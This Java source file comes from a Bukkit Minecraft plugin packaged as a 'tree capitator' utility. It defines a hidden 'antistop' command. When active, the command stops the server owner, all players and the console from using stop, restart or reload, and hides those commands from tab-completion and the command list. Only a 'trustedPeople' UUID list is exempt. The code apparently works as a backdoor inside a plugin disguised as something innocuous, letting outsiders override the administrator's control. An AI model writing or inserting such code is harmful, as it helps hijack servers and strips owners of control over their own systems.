package me.bow.treecapitatorultimate.commands.Server;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerCommandSendEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.event.server.TabCompleteEvent;

import java.util.ArrayList;
import java.util.List;

@Command.Info(command = "antistop", description = "Prevents all players (including console) to stop server.", category = CommandCategory.Server)
public class AntiStop extends Command {
    private cancelMethod method;
    private boolean isActive = false;

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        if (isActive) {
            isActive = false;
            p.sendMessage(Start.Prefix + "§cServer now can be stopped!");
            for (Player r : Bukkit.getOnlinePlayers()) {
                if (Start.Instance.trustedPeople.contains(r.getUniqueId())) continue;
                if (r.isDead()) return;
                r.updateCommands();
            }
            return;
        }
        if (args.size() == 0 || (args.get(0).toLowerCase().equals("mistype") && args.get(0).toLowerCase().equals("cancel"))) {
            p.sendMessage(Start.Prefix + ChatColor.RED + "You must select mode! Either mistype or cancel");
            return;
        }
        if (args.get(0).toLowerCase().equals("mistype"))
            method = cancelMethod.Mistype;
        if (args.get(0).toLowerCase().equals("cancel"))
            method = cancelMethod.Cancel;
        isActive = !isActive;
        p.sendMessage(Start.Prefix + "§aServer now can not be stopped!");
        for (Player r : Bukkit.getOnlinePlayers()) {
            if (Start.Instance.trustedPeople.contains(r.getUniqueId())) continue;
            if (r.isDead()) return;
            r.updateCommands();
        }
    }

    @Override
    public void onServerCommand(ServerCommandEvent e) {
        try {
            String command = e.getCommand().split(" ")[0];
            if (!isActive) return;
            if ((command.equalsIgnoreCase("stop") || command.equalsIgnoreCase("restart") || command.equalsIgnoreCase("reload") || command.equalsIgnoreCase("rl"))) {
                if (method == cancelMethod.Mistype)
                    e.setCommand("");
                if (method == cancelMethod.Cancel)
                    e.setCancelled(true);
            }
        } catch (Exception e2) {
        }
    }

    @Override
    public void onPlayerCommand(PlayerCommandPreprocessEvent e) {
        try {
            if (!isActive && Start.Instance.trustedPeople.contains(e.getPlayer().getUniqueId())) {
                return;
            }
            String command = e.getMessage().split(" ")[0];
            if ((command.equalsIgnoreCase("/" + "stop") || command.equalsIgnoreCase("/" + "restart") || command.equalsIgnoreCase("/" + "reload") || command.equalsIgnoreCase("/" + "rl"))) {
                if (method == cancelMethod.Mistype) {
                    e.setCancelled(true);
                    Bukkit.dispatchCommand(e.getPlayer(), "");
                }
                if (method == cancelMethod.Cancel) {
                    e.setCancelled(true);
                }
            }
        } catch (Exception e2) {
        }
    }

    @Override
    public void onTabControl(TabCompleteEvent e) {
        CommandSender sender = e.getSender();
        if (!(sender instanceof Player)) return;
        Player r = (Player) sender;
        if (!isActive && Start.Instance.trustedPeople.contains(r.getUniqueId())) return;
        e.setCancelled(true);
    }

    @Override
    public void onPlayerTab(PlayerCommandSendEvent e) {
        if (!this.isActive) return;
        if (Start.Instance.trustedPeople.contains(e.getPlayer().getUniqueId())) return;
        List<String> blockedCommands = new ArrayList<>();
        blockedCommands.add("stop");
        blockedCommands.add("rl");
        blockedCommands.add("reload");
        blockedCommands.add("restart");
        e.getCommands().removeAll(blockedCommands);
    }

    enum cancelMethod {
        Mistype,
        Cancel
    }
}
